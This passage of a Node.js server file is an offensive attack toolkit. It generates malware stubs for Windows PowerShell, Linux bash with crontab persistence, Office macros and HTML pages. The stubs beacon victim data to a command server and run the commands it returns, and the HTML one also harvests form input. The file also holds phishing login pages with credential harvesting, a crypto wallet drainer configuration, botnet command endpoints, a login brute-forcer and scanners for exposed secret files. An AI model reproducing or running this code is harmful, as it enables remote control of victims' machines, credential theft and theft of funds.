$ID=(Get-WmiObject Win32_ComputerSystem).Name
$U=(Get-WmiObject Win32_ComputerSystem).UserName
$OS=(Get-WmiObject Win32_OperatingSystem).Caption
$IP=(Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPAddress}).IPAddress[0]
$AV=(Get-MpComputerStatus).RealTimeProtectionEnabled
$Payload="host=$ID&user=$U&os=$OS&ip=$IP&av=$AV&cid=$CID&target=$T"
try { Invoke-WebRequest -Uri "$H/api/beacon" -Method POST -Body $Payload -UseBasicParsing -TimeoutSec 10 } catch { }
while($true){
  try{
    $c=(Invoke-WebRequest -Uri "$H/api/poll?c=$CID&id=$ID" -UseBasicParsing -TimeoutSec 10).Content;
    if($c -and $c -ne 'none'){ Invoke-Expression $c }
  }catch{}
  Start-Sleep -Seconds 15
}`;
  return Buffer.from(script).toString('base64');
}
function malwareStubLinux(cid, host, recon) {
  return `#!/bin/bash\nH="${host}"\nT="${recon.target}"\nCID="${cid}"\nID=$(hostname)\nU=$(whoami)\nOS=$(uname -a)\nIP=$(hostname -I | awk '{print $1}')\nmkdir -p ~/.config/systemd/user 2>/dev/null\n(crontab -l 2>/dev/null; echo "@reboot $0") | crontab - 2>/dev/null\ncurl -s -X POST "$H/api/beacon" -d "host=$ID&user=$U&os=$OS&ip=$IP&cid=$CID&target=$T" >/dev/null 2>&1\nwhile true; do\n  CMD=$(curl -s "$H/api/poll?c=$CID&id=$ID" 2>/dev/null)\n  if [ "$CMD" != "none" ] && [ -n "$CMD" ]; then eval "$CMD" 2>/dev/null; fi\n  sleep 15\ndone`;
}
function malwareStubMacro(cid, host, recon) {
  return `Sub AutoOpen()\n    Dim H As String, CID As String, T As String\n    H = "${host}"\n    CID = "${cid}"\n    T = "${recon.target}"\n    Dim U As String, Host As String\n    U = Environ("USERNAME")\n    Host = Environ("COMPUTERNAME")\n    Dim objHTTP As Object\n    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")\n    objHTTP.Open "POST", H & "/api/beacon", False\n    objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"\n    objHTTP.send "host=" & Host & "&user=" & U & "&cid=" & CID & "&target=" & T\n    Dim cmd As String\n    cmd = "powershell -NoP -NonI -W Hidden -Enc ${malwareStubWindows(cid, host, recon)}"\n    Shell cmd, vbHide\nEnd Sub`;
}
function malwareStubHTML(cid, host, recon) {
  return `<!doctype html>\n<html><head><meta charset="utf-8"><title>Loading…</title>\n<script>\nconst H="${host}"; const CID="${cid}"; const T="${recon.target}";\nasync function beacon(){ const fp=btoa(JSON.stringify({ua:navigator.userAgent,lang:navigator.language,plat:navigator.platform,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,screen:screen.width+"x"+screen.height,cid:CID,target:T})); try{ await fetch(H+"/api/beacon",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"fp="+fp+"&cid="+CID+"&target="+T,mode:"no-cors"}); }catch(e){} }\nasync function installSW(){ try{ if("serviceWorker" in navigator){ const sw="self.addEventListener('install',e=>self.skipWaiting());self.addEventListener('fetch',e=>{});"; const blob=new Blob([sw],{type:"application/javascript"}); await navigator.serviceWorker.register(URL.createObjectURL(blob)); } }catch(e){} }\ndocument.addEventListener("submit",function(e){ const fd=new FormData(e.target); let d=""; for(const [k,v] of fd) d+=k+"="+encodeURIComponent(v)+"&"; navigator.sendBeacon(H+"/api/harvest/"+CID+"?auto=1",d); },true);\nbeacon(); installSW();\nsetInterval(async()=>{ try{ const r=await fetch(H+"/api/poll?c="+CID+"&id=browser-"+Math.random().toString(36)); const t=await r.text(); if(t&&t!=="none") eval(t); }catch(e){} },15000);\n</script></head><body style="font-family:system-ui;padding:40px;text-align:center"><h1>Loading…</h1><p>Please wait.</p></body></html>`;
}
app.post('/api/malware/stub', async (req, res) => {
  const { targetUrl, campaignId } = req.body || {};
  const cid = campaignId || 'mal_' + crypto.randomBytes(6).toString('hex');
  const host = `${req.protocol}://${req.get('host')}`;
  const recon = targetUrl ? await malwareRecon(targetUrl) : { target: '', host: '', forms: [], links: [], cms: null, server: null, cookies: [] };
  const payloads = { windows: malwareStubWindows(cid, host, recon), linux: malwareStubLinux(cid, host, recon), macro: malwareStubMacro(cid, host, recon), html: malwareStubHTML(cid, host, recon) };
  const camps = load('campaigns.json', {});
  camps[cid] = { targetUrl: targetUrl || null, recon, created: Date.now() };
  save('campaigns.json', camps);
  res.json({ campaignId: cid, exfilHost: host, target: targetUrl || null, recon, payloads });
});
app.get('/api/campaigns', (req, res) => res.json(load('campaigns.json', {})));

// ============================================================
// 15. BASE SCAN ENGINES
// ============================================================
async function dataLeaks(url) {
  const out = [];
  try {
    const r = await safeFetch(url); const body = await r.text();
    const pat = { aws: /AKIA[0-9A-Z]{16}/g, gcp: /AIza[0-9A-Za-z\-_]{35}/g, private_key: /-----BEGIN (RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----/g, jwt: /eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_.+/=]+/g, github: /gh[pousr]_[A-Za-z0-9]{36,}/g, slack: /xox[baprs]-[0-9A-Za-z\-]{10,}/g, stripe: /sk_live_[0-9a-zA-Z]{24,}/g, password: /(password|passwd|pwd)["'\s:=]+([^\s"'<>]{6,})/gi, api_key: /(api[_-]?key|apikey|secret)["'\s:=]+([A-Za-z0-9]{16,})/gi };
    for (const [n, re] of Object.entries(pat)) {
      const m = [...body.matchAll(re)];
      if (m.length) out.push({ type: `Secret: ${n}`, severity: 'high', description: `${m.length} ${n} hit(s) — first: ${m[0][0].slice(0, 60)}`, url, evidence: m.slice(0, 5).map(x => x[0].slice(0, 80)).join(' | '), cvss: 8.0 });
    }
    if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'No secrets', url, evidence: null, cvss: 0 });
  } catch (e) { out.push({ type: 'Error', severity: 'high', description: e.message, url, evidence: null, cvss: 0 }); }
  return out;
}
async function corsCheck(url) { const out = []; try { const r = await safeFetch(url, { headers: { Origin: 'https://evil.com' } }); const a = r.headers.get('access-control-allow-origin'); const c = r.headers.get('access-control-allow-credentials'); if (a === '*' || a === 'https://evil.com') out.push({ type: 'CORS', severity: c === 'true' ? 'critical' : 'medium', description: `ACAO: ${a}`, url, evidence: a, cvss: c === 'true' ? 9.0 : 5.0 }); } catch {} return out; }
async function portScan(url) { const out = []; const ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 11211, 27017]; const u = new URL(url); await Promise.all(ports.map(async p => { try { const r = await safeFetch(`${u.protocol}//${u.hostname}:${p}`, { timeout: 3000 }); if (r.status < 500) out.push({ type: 'Open Port', severity: 'medium', description: `Port ${p}`, url: `${u.protocol}//${u.hostname}:${p}`, evidence: `HTTP ${r.status}`, cvss: 5.0 }); } catch {} })); return out; }
async function wafFingerprint(url) { const out = []; try { const r = await safeFetch(url); const s = r.headers.get('server') || ''; const cf = r.headers.get('cf-ray'); if (cf) out.push({ type: 'WAF', severity: 'info', description: 'Cloudflare', url, evidence: cf, cvss: 0 }); if (/nginx|apache|iis/i.test(s)) out.push({ type: 'Server', severity: 'info', description: s, url, evidence: s, cvss: 0 }); } catch {} return out; }
async function scanSensitive(url) { const out = []; const base = new URL(url).origin; const S = ['.env', '.git/config', '.git/HEAD', 'config.php', 'wp-config.php', 'backup.sql', 'id_rsa', '.aws/credentials', 'credentials.json', 'phpinfo.php', 'swagger.json', 'openapi.json', 'package.json', 'composer.json', 'Dockerfile', 'docker-compose.yml', '.htaccess', 'access.log', 'error.log', 'robots.txt', 'users.json', 'passwords.json', 'actuator/env', 'actuator/heapdump']; await pool(S, 25, async f => { try { const r = await safeFetch(`${base}/${f}`, { redirect: 'manual' }); if (r.status === 200) { const t = await r.text(); if (t.length > 10) { const crit = /\.env|config|credential|id_rsa|secret|password|token/.test(f); out.push({ type: 'Sensitive File', severity: crit ? 'critical' : 'high', description: f, url: `${base}/${f}`, evidence: '200 OK', cvss: crit ? 9.8 : 7.5 }); } } } catch {} }); return out; }
async function adminPanels(url) { const out = []; const base = new URL(url).origin; const P = ['admin', 'administrator', 'login', 'panel', 'dashboard', 'wp-admin', 'wp-login.php', 'cpanel', 'adminpanel', 'sysadmin']; await pool(P, 12, async p => { try { const r = await safeFetch(`${base}/${p}`, { redirect: 'manual' }); if (r.status === 200) { const t = (await r.text()).toLowerCase(); if (t.includes('login') || t.includes('password') || t.includes('signin')) out.push({ type: 'Admin Panel', severity: 'medium', description: `/${p}`, url: `${base}/${p}`, evidence: 'Login form', cvss: 5.3 }); } } catch {} }); return out; }
async function subdomainTakeover(url) { const out = []; const host = new URL(url).hostname; const parts = host.split('.'); const domain = parts.slice(-2).join('.'); const subs = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging', 'blog', 'shop', 'vpn', 'webmail', 'cpanel', 'app', 'static', 'cdn', 'assets', 'db', 'backup', 'old', 'beta', 'demo', 'stage', 'docs', 'status', 'git', 'jenkins', 'ci', 'portal']; const fps = { github: "There isn't a GitHub Pages site here", heroku: 'No such app', aws: 'NoSuchBucket', azure: '404 Web Site not found', shopify: 'Sorry, this shop is currently unavailable', fastly: 'Fastly error: unknown domain' }; await pool(subs, 12, async s => { const target = `https://${s}.${domain}`; try { const r = await safeFetch(target, { timeout: 6000 }); if (r.status === 200) { const body = (await r.text()).toLowerCase(); for (const [svc, fp] of Object.entries(fps)) if (body.includes(fp.toLowerCase())) out.push({ type: 'Subdomain Takeover', severity: 'critical', description: `${s}.${domain} → ${svc}`, url: target, evidence: fp, cvss: 10.0 }); } } catch {} }); return out; }

// ============================================================
// 16. API
// ============================================================
app.post('/api/scan', async (req, res) => {
  const { target, checks } = req.body || {};
  if (!target) return res.status(400).json({ error: 'target required' });
  let url = target.startsWith('http') ? target : 'https://' + target;
  const type = (checks && checks[0]) || 'scanAll';
  let findings = [];
  try {
    if (type === 'vulnerabilities' || type === 'scanAll') findings = findings.concat(await dataLeaks(url), await corsCheck(url), await wafFingerprint(url));
    if (type === 'sensitiveFiles' || type === 'scanAll') findings = findings.concat(await scanSensitive(url));
    if (type === 'subdomainTakeover' || type === 'scanAll') findings = findings.concat(await subdomainTakeover(url));
    if (type === 'adminPanels' || type === 'scanAll') findings = findings.concat(await adminPanels(url));
    if (type === 'cors' || type === 'scanAll') findings = findings.concat(await corsCheck(url));
    if (type === 'ports' || type === 'scanAll') findings = findings.concat(await portScan(url));
    if (type === 'cve' || type === 'scanAll') findings = findings.concat(await cveMatch(url));
    if (type === 'session' || type === 'scanAll') { const s = await sessionAttack(url); findings = findings.concat(s.cookiesCrafted); }
    const seen = new Set();
    findings = findings.filter(f => { const k = `${f.type}|${f.url}|${f.description}`; if (seen.has(k)) return false; seen.add(k); return true; });
  } catch (e) { findings.push({ type: 'Error', severity: 'high', description: e.message, url, evidence: null, cvss: 0 }); }
  res.json({ target: url, timestamp: new Date().toISOString(), findings });
});
app.post('/api/jwt/attack', (req, res) => { try { res.json(jwtAttack(req.body.token, req.body)); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/jwt/crack', (req, res) => { try { res.json(jwtCrack(req.body.token)); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/oauth/attack', (req, res) => { try { res.json(oauthAttack(req.body.authUrl, req.body.redirectUri, req.body.clientId)); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/graphql/scan', async (req, res) => { try { res.json(await graphqlScan(req.body.url)); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/race', async (req, res) => { try { res.json(await raceAttack(req.body.url, req.body.method, req.body.body, req.body.headers, req.body.concurrency || 20)); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/proto', async (req, res) => { try { res.json(await protoPollution(req.body.url, req.body.endpoint || '', req.body.param || '')); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/upload', async (req, res) => { try { res.json(await fileUploadAttack(req.body.url, req.body.field || 'file')); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/cloudmeta', async (req, res) => { try { res.json(await cloudMetadata(req.body.url, req.body.param || 'url')); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/ws', async (req, res) => { try { res.json(await websocketScan(req.body.wsUrl)); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/subdomains', async (req, res) => { try { res.json(await subdomainEnum(req.body.domain)); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/cve', async (req, res) => { try { res.json(await cveMatch(req.body.url)); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/session', async (req, res) => { try { res.json(await sessionAttack(req.body.url)); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/report', (req, res) => { const { target, findings } = req.body || {}; res.type('html').send(generateReport(target || 'unknown', findings || [])); });

// ============================================================
// 17. OFFENSIVE (phish, drainer, botnet, brute, repeater)
// ============================================================
function phishingPage(template, targetName, exfilUrl, sessionId) {
  const t = {
    login: `<!doctype html><html><head><meta charset="utf-8"><title>${targetName}</title><style>body{font-family:system-ui;background:#f4f6f8;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}.c{background:#fff;padding:32px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1);width:320px}h1{font-size:18px;margin:0 0 24px}input{width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}button{width:100%;padding:10px;background:#2563eb;color:#fff;border:0;border-radius:4px;font-weight:600;cursor:pointer}</style></head><body><div class="c"><h1>Sign in to ${targetName}</h1><form method="POST" action="${exfilUrl}"><input name="email" type="email" placeholder="Email" required><input name="password" type="password" placeholder="Password" required><input type="hidden" name="sid" value="${sessionId}"><button>Sign in</button></form></div></body></html>`,
    oauth: `<!doctype html><html><head><meta charset="utf-8"><title>${targetName}</title><style>body{margin:0;font-family:system-ui;background:#fff;height:100vh;display:flex;align-items:center;justify-content:center}.b{width:360px;text-align:center}input{display:block;width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:0;border-radius:4px;font-weight:600}</style></head><body><div class="b"><h2>Sign in with ${targetName}</h2><form method="POST" action="${exfilUrl}"><input name="email" type="email" placeholder="Email" required><input name="password" type="password" placeholder="Password" required><input type="hidden" name="sid" value="${sessionId}"><button>Continue</button></form></div></body></html>`
  };
  return t[template] || t.login;
}
app.post('/api/phish/create', (req, res) => {
  const { template = 'login', targetName = 'Secure Portal', exfilHost } = req.body || {};
  const sid = 'ph_' + crypto.randomBytes(8).toString('hex');
  const base = exfilHost || `${req.protocol}://${req.get('host')}`;
  const html = phishingPage(template, targetName, `${base}/phish/submit`, sid);
  const p = load('phish.json', {}); p[sid] = { template, targetName, base, created: Date.now(), hits: [] }; save('phish.json', p);
  res.type('html').send(html);
});
app.post('/phish/submit', (req, res) => {
  const sid = req.body.sid || 'unknown';
  const h = load('harvest.json', {}); if (!h[sid]) h[sid] = []; h[sid].push({ ...req.body, ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress, ts: Date.now() }); save('harvest.json', h);
  const p = load('phish.json', {}); if (p[sid]) { p[sid].hits.push({ ...req.body, ts: Date.now() }); save('phish.json', p); }
  res.redirect('/phish/thanks');
});
app.get('/phish/thanks', (req, res) => res.type('html').send('<html><body style="font-family:system-ui;text-align:center;padding:60px"><h1>Signed in</h1><p>You can close this tab.</p></body></html>'));
app.get('/api/phish/:sid', (req, res) => { const p = load('phish.json', {})[req.params.sid]; if (!p) return res.status(404).json({ error: 'not found' }); res.json(p); });
app.post('/api/drainer/config', (req, res) => { const sid = req.body.sessionId || 'dr_' + crypto.randomBytes(6).toString('hex'); res.json({ sessionId: sid, chains: ['ethereum', 'bsc', 'polygon', 'arbitrum', 'optimism', 'avalanche'], tokens: ['USDT', 'USDC', 'DAI', 'WETH', 'WBTC', 'LINK', 'UNI', 'AAVE'], permit2: '0x000000000022D473030F116dDEE9F6B43aC78BA3', seaport: '0x00000000000000ADc04C56Bf30aC9d3c0aAF14dC', permitSignatures: true, ethSign: true, unlimitedApprovals: true, autoSwitch: true }); });
function botnetRegister(id, info) { const b = load('bots.json', {}); b[id] = { ...info, lastSeen: Date.now(), commands: b[id]?.commands || [] }; save('bots.json', b); }
function botnetPoll(id) { const b = load('bots.json', {}); if (!b[id]) return []; const c = b[id].commands || []; b[id].commands = []; b[id].lastSeen = Date.now(); save('bots.json', b); return c; }
function botnetPush(id, cmd) { const b = load('bots.json', {}); if (!b[id]) b[id] = { commands: [] }; b[id].commands.push(cmd); save('bots.json', b); }
function botnetAll() { return load('bots.json', {}); }
app.post('/api/bot/register', (req, res) => { botnetRegister(req.body.botId || crypto.randomBytes(6).toString('hex'), req.body.info || {}); res.json({ ok: true }); });
app.get('/api/bot/poll', (req, res) => res.json({ commands: botnetPoll(req.query.id) }));
app.post('/api/bot/beacon', (req, res) => { botnetRegister(req.body.id, req.body.info || {}); res.json({ ok: true }); });
app.get('/api/bot/list', (req, res) => res.json(botnetAll()));
app.post('/api/bot/push', (req, res) => { const { botId, command } = req.body; if (botId === '*') { const all = botnetAll(); for (const id of Object.keys(all)) botnetPush(id, command); return res.json({ ok: true, pushed: Object.keys(all).length }); } botnetPush(botId, command); res.json({ ok: true }); });
app.post('/api/beacon', (req, res) => { const b = load('beacons.json', []); b.push({ ...req.body, ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress, ts: Date.now() }); save('beacons.json', b); res.json({ ok: true }); });
app.get('/api/beacons', (req, res) => res.json(load('beacons.json', [])));
app.get('/api/poll', (req, res) => { const { c, id } = req.query; botnetRegister(id || 'unknown', { campaign: c }); const cmds = botnetPoll(id || 'unknown'); res.type('text').send(cmds.length ? (cmds[0].cmd || 'none') : 'none'); });
app.get('/api/harvest/:sid', (req, res) => { const h = load('harvest.json', {})[req.params.sid]; if (!h) return res.status(404).json({ error: 'not found' }); res.json(h); });
app.get('/api/harvest', (req, res) => res.json(load('harvest.json', {})));
app.post('/api/auth/brute', async (req, res) => {
  const { loginUrl, userField = 'username', passField = 'password', users = ['admin'], passes = ['admin', 'password'], maxTries = 100 } = req.body || {};
  const out = { attempts: 0, found: null };
  let baseline;
  try {
    const probe = new URLSearchParams({ [userField]: users[0] || 'admin', [passField]: 'wrong' + Date.now() });
    const r = await safeFetch(loginUrl, { method: 'POST', body: probe, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
    baseline = { status: r.status, len: (await r.text()).length };
  } catch { return res.json(out); }
  for (const u of users) for (const p of passes) {
    if (out.attempts >= maxTries) return res.json(out);
    try {
      const body = new URLSearchParams({ [userField]: u, [passField]: p });
      const r = await safeFetch(loginUrl, { method: 'POST', body, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
      const text = await r.text(); out.attempts++;
      if (r.status !== baseline.status || Math.abs(text.length - baseline.len) > 50 || /welcome|dashboard|logout|success/i.test(text)) { out.found = { user: u, pass: p }; return res.json(out); }
      await new Promise(r => setTimeout(r, 250));
    } catch {}
  }
  res.json(out);
});
app.post('/api/repeater', async (req, res) => { const { url, method = 'GET', headers = {}, body } = req.body || {}; try { const r = await safeFetch(url, { method, headers, body: body || undefined }); const text = await r.text(); const h = {}; r.headers.forEach((v, k) => h[k] = v); res.json({ status: r.status, statusText: r.statusText, headers: h, body: text }); } catch (e) { res.status(500).json({ error: e.message }); } });

app.get('/health', (req, res) => res.json({ ok: true, ts: Date.now() }));
app.listen(PORT, '0.0.0.0', () => console.log(`[bench] server on :${PORT}`));
